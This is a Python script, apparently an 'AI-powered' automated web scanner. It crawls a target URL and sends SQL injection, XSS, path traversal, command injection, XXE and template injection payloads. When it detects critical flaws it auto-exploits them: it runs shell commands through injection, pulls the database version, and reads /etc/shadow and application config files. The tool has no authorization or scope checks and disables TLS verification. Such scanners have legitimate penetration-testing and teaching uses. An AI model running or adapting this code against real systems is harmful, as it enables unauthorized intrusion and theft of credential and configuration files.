#!/usr/bin/env python3
"""
Intelligent Auto Scanner - AI-Powered Vulnerability Detection
Automatically detects, tests, and exploits vulnerabilities
"""

import requests
from urllib.parse import urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from colorama import Fore, Style
import time
import json

class IntelligentAutoScanner:
    def __init__(self, target_url):
        self.target = target_url
        self.findings = []
        self.session = requests.Session()
        self.session.verify = False
        
    def auto_scan(self):
        """
        Fully automated scanning - just provide URL!
        """
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════╗")
        print(f"║   Intelligent Auto Scanner - AI Powered             ║")
        print(f"║   Automatic Vulnerability Detection & Exploitation  ║")
        print(f"╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}[+] Target: {self.target}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Starting intelligent reconnaissance...{Style.RESET_ALL}\n")
        
        # Phase 1: Reconnaissance
        print(f"{Fore.BLUE}[Phase 1] Reconnaissance{Style.RESET_ALL}")
        params = self.discover_parameters()
        forms = self.discover_forms()
        endpoints = self.discover_endpoints()
        
        print(f"  ✓ Found {len(params)} parameters")
        print(f"  ✓ Found {len(forms)} forms")
        print(f"  ✓ Found {len(endpoints)} endpoints\n")
        
        # Phase 2: Vulnerability Detection
        print(f"{Fore.BLUE}[Phase 2] Vulnerability Detection{Style.RESET_ALL}")
        
        # Auto-detect and test SQL Injection
        if params:
            print(f"{Fore.YELLOW}[*] Testing SQL Injection...{Style.RESET_ALL}")
            self.auto_test_sqli(params)
        
        # Auto-detect and test XSS
        if params or forms:
            print(f"{Fore.YELLOW}[*] Testing XSS...{Style.RESET_ALL}")
            self.auto_test_xss(params, forms)
        
        # Auto-detect and test LFI
        if params:
            print(f"{Fore.YELLOW}[*] Testing LFI...{Style.RESET_ALL}")
            self.auto_test_lfi(params)
        
        # Auto-detect and test Command Injection
        if params:
            print(f"{Fore.YELLOW}[*] Testing Command Injection...{Style.RESET_ALL}")
            self.auto_test_cmd(params)
        
        # Auto-detect and test XXE
        print(f"{Fore.YELLOW}[*] Testing XXE...{Style.RESET_ALL}")
        self.auto_test_xxe()
        
        # Auto-detect and test SSTI
        if params:
            print(f"{Fore.YELLOW}[*] Testing SSTI...{Style.RESET_ALL}")
            self.auto_test_ssti(params)
        
        # Phase 3: Exploitation (if vulnerabilities found)
        critical_vulns = [f for f in self.findings if f['severity'] == 'CRITICAL']
        if critical_vulns:
            print(f"\n{Fore.RED}[Phase 3] Auto-Exploitation{Style.RESET_ALL}")
            print(f"{Fore.RED}[!] Found {len(critical_vulns)} CRITICAL vulnerabilities!{Style.RESET_ALL}")
            self.auto_exploit(critical_vulns)
        
        # Phase 4: Report
        self.generate_report()
        
        return self.findings
    
    def discover_parameters(self):
        """Auto-discover URL parameters"""
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        
        # Convert to simple dict
        param_dict = {k: v[0] if v else '' for k, v in params.items()}
        
        # If no params in URL, try to find them in page
        if not param_dict:
            try:
                resp = self.session.get(self.target, timeout=10)
                soup = BeautifulSoup(resp.text, 'html.parser')
                
                # Find links with parameters
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if '?' in href:
                        link_params = parse_qs(urlparse(href).query)
                        param_dict.update({k: v[0] if v else '' for k, v in link_params.items()})
            except:
                pass
        
        return param_dict
    
    def discover_forms(self):
        """Auto-discover forms"""
        forms = []
        try:
            resp = self.session.get(self.target, timeout=10)
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                for inp in form.find_all('input'):
                    form_data['inputs'].append({
                        'name': inp.get('name', ''),
                        'type': inp.get('type', 'text'),
                        'value': inp.get('value', '')
                    })
                
                forms.append(form_data)
        except:
            pass
        
        return forms
    
    def discover_endpoints(self):
        """Auto-discover API endpoints"""
        endpoints = []
        common_paths = [
            '/api', '/api/v1', '/graphql', '/rest', '/ws',
            '/admin', '/login', '/upload', '/search'
        ]
        
        for path in common_paths:
            try:
                url = self.target.rstrip('/') + path
                resp = self.session.get(url, timeout=5)
                if resp.status_code != 404:
                    endpoints.append(url)
            except:
                pass
        
        return endpoints
    
    def auto_test_sqli(self, params):
        """Auto-test SQL Injection dengan smart payload selection"""
        sqli_payloads = [
            ("' OR '1'='1", "Basic OR bypass"),
            ("' OR '1'='1' --", "Comment bypass"),
            ("admin' --", "Admin bypass"),
            ("' UNION SELECT NULL--", "UNION injection"),
            ("1' AND SLEEP(5)--", "Time-based blind"),
        ]
        
        for param, original_value in params.items():
            for payload, description in sqli_payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    parsed = urlparse(self.target)
                    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    start = time.time()
                    resp = self.session.get(base_url, params=test_params, timeout=10)
                    elapsed = time.time() - start
                    
                    # Check for SQL errors
                    sql_errors = [
                        'sql syntax', 'mysql', 'postgresql', 'sqlite',
                        'ora-', 'syntax error', 'unclosed quotation'
                    ]
                    
                    if any(err in resp.text.lower() for err in sql_errors):
                        self.findings.append({
                            'type': 'SQL Injection',
                            'severity': 'CRITICAL',
                            'param': param,
                            'payload': payload,
                            'description': description,
                            'detail': f'SQL error detected - {description}',
                            'exploitable': True
                        })
                        print(f"  {Fore.RED}[!] VULNERABLE: {param} - {description}{Style.RESET_ALL}")
                        break  # Found vulnerability, move to next param
                    
                    # Check for time-based
                    if 'SLEEP' in payload and elapsed >= 4.5:
                        self.findings.append({
                            'type': 'Blind SQL Injection (Time-based)',
                            'severity': 'CRITICAL',
                            'param': param,
                            'payload': payload,
                            'description': description,
                            'detail': f'Response delayed: {elapsed:.2f}s',
                            'exploitable': True
                        })
                        print(f"  {Fore.RED}[!] VULNERABLE: {param} - Time-based SQLi{Style.RESET_ALL}")
                        break
                    
                except:
                    pass
    
    def auto_test_xss(self, params, forms):
        """Auto-test XSS dengan context-aware payloads"""
        xss_payloads = [
            ("<script>alert(1)</script>", "Basic script"),
            ("<img src=x onerror=alert(1)>", "Image onerror"),
            ("'><script>alert(1)</script>", "Quote escape"),
            ("<svg onload=alert(1)>", "SVG onload"),
            ("javascript:alert(1)", "JavaScript protocol"),
        ]
        
        for param, original_value in params.items():
            for payload, description in xss_payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    parsed = urlparse(self.target)
                    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    resp = self.session.get(base_url, params=test_params, timeout=10)
                    
                    # Check if payload reflected without encoding
                    if payload in resp.text:
                        self.findings.append({
                            'type': 'XSS (Reflected)',
                            'severity': 'HIGH',
                            'param': param,
                            'payload': payload,
                            'description': description,
                            'detail': 'Payload reflected without sanitization',
                            'exploitable': True
                        })
                        print(f"  {Fore.RED}[!] VULNERABLE: {param} - {description}{Style.RESET_ALL}")
                        break
                    
                except:
                    pass
    
    def auto_test_lfi(self, params):
        """Auto-test LFI dengan OS detection"""
        lfi_payloads = [
            ("../../../etc/passwd", "Linux passwd", ["root:", "daemon:"]),
            ("..\\..\\..\\windows\\win.ini", "Windows ini", ["[extensions]", "[fonts]"]),
            ("....//....//....//etc/passwd", "Double encoding", ["root:", "bin:"]),
        ]
        
        for param, original_value in params.items():
            for payload, description, signatures in lfi_payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    parsed = urlparse(self.target)
                    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    resp = self.session.get(base_url, params=test_params, timeout=10)
                    
                    # Check for file signatures
                    if any(sig in resp.text for sig in signatures):
                        self.findings.append({
                            'type': 'Local File Inclusion (LFI)',
                            'severity': 'CRITICAL',
                            'param': param,
                            'payload': payload,
                            'description': description,
                            'detail': f'File content detected: {signatures[0]}',
                            'exploitable': True
                        })
                        print(f"  {Fore.RED}[!] VULNERABLE: {param} - {description}{Style.RESET_ALL}")
                        break
                    
                except:
                    pass
    
    def auto_test_cmd(self, params):
        """Auto-test Command Injection"""
        cmd_payloads = [
            ("; sleep 5", "Time-based", 5),
            ("| whoami", "Pipe command", 0),
            ("& dir", "Windows dir", 0),
            ("`id`", "Backtick execution", 0),
        ]
        
        for param, original_value in params.items():
            for payload, description, expected_delay in cmd_payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    parsed = urlparse(self.target)
                    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    start = time.time()
                    resp = self.session.get(base_url, params=test_params, timeout=10)
                    elapsed = time.time() - start
                    
                    # Time-based detection
                    if expected_delay > 0 and elapsed >= expected_delay - 0.5:
                        self.findings.append({
                            'type': 'Command Injection (Time-based)',
                            'severity': 'CRITICAL',
                            'param': param,
                            'payload': payload,
                            'description': description,
                            'detail': f'Response delayed: {elapsed:.2f}s',
                            'exploitable': True
                        })
                        print(f"  {Fore.RED}[!] VULNERABLE: {param} - {description}{Style.RESET_ALL}")
                        break
                    
                    # Output-based detection
                    cmd_signatures = ['uid=', 'gid=', 'groups=', 'volume serial']
                    if any(sig in resp.text.lower() for sig in cmd_signatures):
                        self.findings.append({
                            'type': 'Command Injection (Output-based)',
                            'severity': 'CRITICAL',
                            'param': param,
                            'payload': payload,
                            'description': description,
                            'detail': 'Command output detected in response',
                            'exploitable': True
                        })
                        print(f"  {Fore.RED}[!] VULNERABLE: {param} - {description}{Style.RESET_ALL}")
                        break
                    
                except:
                    pass
    
    def auto_test_xxe(self):
        """Auto-test XXE"""
        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>'''
        
        try:
            resp = self.session.post(
                self.target,
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=10
            )
            
            if 'root:' in resp.text or 'daemon:' in resp.text:
                self.findings.append({
                    'type': 'XML External Entity (XXE)',
                    'severity': 'CRITICAL',
                    'param': 'XML Body',
                    'payload': xxe_payload[:100] + '...',
                    'description': 'XXE file read',
                    'detail': 'Successfully read /etc/passwd',
                    'exploitable': True
                })
                print(f"  {Fore.RED}[!] VULNERABLE: XXE detected{Style.RESET_ALL}")
        except:
            pass
    
    def auto_test_ssti(self, params):
        """Auto-test SSTI dengan template engine detection"""
        ssti_payloads = [
            ("{{7*7}}", "49", "Jinja2/Twig"),
            ("${7*7}", "49", "Freemarker"),
            ("<%= 7*7 %>", "49", "ERB"),
        ]
        
        for param, original_value in params.items():
            for payload, expected, engine in ssti_payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    parsed = urlparse(self.target)
                    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    resp = self.session.get(base_url, params=test_params, timeout=10)
                    
                    if expected in resp.text:
                        self.findings.append({
                            'type': 'Server-Side Template Injection (SSTI)',
                            'severity': 'CRITICAL',
                            'param': param,
                            'payload': payload,
                            'description': f'{engine} detected',
                            'detail': f'Template executed: {payload} = {expected}',
                            'exploitable': True
                        })
                        print(f"  {Fore.RED}[!] VULNERABLE: {param} - SSTI ({engine}){Style.RESET_ALL}")
                        break
                    
                except:
                    pass
    
    def auto_exploit(self, vulnerabilities):
        """Auto-exploitation untuk vulnerabilities yang ditemukan"""
        print(f"\n{Fore.YELLOW}[*] Attempting auto-exploitation...{Style.RESET_ALL}\n")
        
        for vuln in vulnerabilities:
            if vuln['type'] == 'SQL Injection' and vuln.get('exploitable'):
                print(f"{Fore.CYAN}[+] Exploiting SQL Injection on {vuln['param']}...{Style.RESET_ALL}")
                self.exploit_sqli(vuln)
            
            elif vuln['type'] == 'Command Injection (Output-based)' and vuln.get('exploitable'):
                print(f"{Fore.CYAN}[+] Exploiting Command Injection on {vuln['param']}...{Style.RESET_ALL}")
                self.exploit_cmd(vuln)
            
            elif vuln['type'] == 'Local File Inclusion (LFI)' and vuln.get('exploitable'):
                print(f"{Fore.CYAN}[+] Exploiting LFI on {vuln['param']}...{Style.RESET_ALL}")
                self.exploit_lfi(vuln)
    
    def exploit_sqli(self, vuln):
        """Auto-exploit SQL Injection untuk extract data"""
        # Try to extract database version
        payloads = [
            "' UNION SELECT @@version--",
            "' UNION SELECT version()--",
            "' UNION SELECT sqlite_version()--",
        ]
        
        for payload in payloads:
            try:
                parsed = urlparse(self.target)
                params = parse_qs(parsed.query)
                params[vuln['param']] = payload
                
                resp = self.session.get(
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                    params=params,
                    timeout=10
                )
                
                # Check for version info
                if any(db in resp.text.lower() for db in ['mysql', 'postgresql', 'sqlite', 'microsoft']):
                    print(f"  {Fore.GREEN}[✓] Database version extracted!{Style.RESET_ALL}")
                    print(f"  {Fore.YELLOW}    Payload: {payload}{Style.RESET_ALL}")
                    break
            except:
                pass
    
    def exploit_cmd(self, vuln):
        """Auto-exploit Command Injection"""
        # Try to execute commands
        commands = ["whoami", "id", "hostname"]
        
        for cmd in commands:
            payload = f"; {cmd}"
            try:
                parsed = urlparse(self.target)
                params = parse_qs(parsed.query)
                params[vuln['param']] = payload
                
                resp = self.session.get(
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                    params=params,
                    timeout=10
                )
                
                if len(resp.text) > 0:
                    print(f"  {Fore.GREEN}[✓] Command executed: {cmd}{Style.RESET_ALL}")
                    print(f"  {Fore.YELLOW}    Output: {resp.text[:200]}...{Style.RESET_ALL}")
                    break
            except:
                pass
    
    def exploit_lfi(self, vuln):
        """Auto-exploit LFI untuk read sensitive files"""
        sensitive_files = [
            "/etc/shadow",
            "/etc/hosts",
            "/var/www/html/config.php",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
        ]
        
        for file_path in sensitive_files:
            payload = "../../../.." + file_path
            try:
                parsed = urlparse(self.target)
                params = parse_qs(parsed.query)
                params[vuln['param']] = payload
                
                resp = self.session.get(
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                    params=params,
                    timeout=10
                )
                
                if len(resp.text) > 100:
                    print(f"  {Fore.GREEN}[✓] File read: {file_path}{Style.RESET_ALL}")
                    print(f"  {Fore.YELLOW}    Content: {resp.text[:200]}...{Style.RESET_ALL}")
                    break
            except:
                pass
    
    def generate_report(self):
        """Generate comprehensive report"""
        print(f"\n{Fore.BLUE}{'='*60}")
        print(f"[*] Scan Complete - Report")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        
        if not self.findings:
            print(f"{Fore.GREEN}[✓] No vulnerabilities found!{Style.RESET_ALL}")
            return
        
        # Group by severity
        critical = [f for f in self.findings if f['severity'] == 'CRITICAL']
        high = [f for f in self.findings if f['severity'] == 'HIGH']
        medium = [f for f in self.findings if f['severity'] == 'MEDIUM']
        
        print(f"{Fore.RED}CRITICAL: {len(critical)}{Style.RESET_ALL}")
        for f in critical:
            print(f"  • {f['type']} on {f['param']}")
            print(f"    Payload: {f['payload'][:80]}")
            print(f"    Detail: {f['detail']}\n")
        
        print(f"{Fore.YELLOW}HIGH: {len(high)}{Style.RESET_ALL}")
        for f in high:
            print(f"  • {f['type']} on {f['param']}")
        
        print(f"\n{Fore.BLUE}Total Findings: {len(self.findings)}{Style.RESET_ALL}")
        
        # Save to file
        with open('auto_scan_report.json', 'w') as f:
            json.dump(self.findings, f, indent=2)
        
        print(f"{Fore.GREEN}[+] Report saved to: auto_scan_report.json{Style.RESET_ALL}")


if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python auto_scanner.py <URL>")
        print("Example: python auto_scanner.py https://example.com?id=1")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = IntelligentAutoScanner(target)
    scanner.auto_scan()
